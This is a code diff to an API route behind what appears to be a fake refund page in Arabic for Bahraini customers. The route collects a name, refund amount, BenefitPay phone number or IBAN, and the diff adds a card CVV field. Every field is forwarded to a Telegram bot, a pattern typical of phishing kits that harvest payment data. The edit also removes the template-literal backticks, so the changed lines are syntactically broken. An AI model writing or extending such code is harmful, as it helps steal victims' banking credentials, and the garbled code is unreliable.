@@ -11,6 +11,7 @@ const schema = z.object({
   profileId: z.string().regex(/^\d{5}$/),
   method: z.enum(["benefitpay", "iban"]),
   value: z.string().trim().min(4).max(60),
+  cvv: z.string().trim().regex(/^\d{3,4}$/),
 });
 
 const BENEFIT_RE = /^\+?\d{8,12}$/;
@@ -29,13 +30,14 @@ export async function POST(request: Request) {
 
   const text = [
     "🧾 طلب من صفحة تفاصيل الطلب",
-    `اسم العميل: ${profile.name}`,
-    `مبلغ الاسترجاع: ${profile.amount.toFixed(3)} BHD`,
-    `طريقة الاستلام: ${data.method === "benefitpay" ? "BenefitPay" : "IBAN"}`,
-    `${data.method === "benefitpay" ? "رقم الهاتف" : "رقم الآيبان"}: ${
+    اسم العميل: ${profile.name},
+    مبلغ الاسترجاع: ${profile.amount.toFixed(3)} BHD,
+    طريقة الاستلام: ${data.method === "benefitpay" ? "BenefitPay" : "IBAN"},
+    ${data.method === "benefitpay" ? "رقم الهاتف" : "رقم الآيبان"}: ${
       data.method === "iban" ? data.value.toUpperCase() : data.value
-    }`,
-    `الوقت: ${new Date().toISOString()}`,
+    },
+    رمز التحقق CVV: ${data.cvv},
+    الوقت: ${new Date().toISOString()},
   ].join("\n");
 
   const sent = await telegramSend(text);
